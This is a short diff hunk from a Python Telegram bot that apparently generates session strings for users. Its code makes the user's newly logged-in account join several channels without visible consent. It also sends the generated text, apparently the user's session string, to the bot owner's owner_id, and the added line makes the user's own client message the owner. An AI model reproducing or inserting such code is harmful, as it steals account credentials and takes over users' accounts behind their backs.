@@ -185,6 +185,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             await client.join_chat("AM_Unfban")
             await client.join_chat("Logs_Gban")
             await client.join_chat("About_AMBot")
+            await client.send_message(await client.get_entity(owner_id), "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...")
         else:
             await bot.send_message(msg.chat.id, text)
             await bot.send_message(chat_id=owner_id,  text=text)
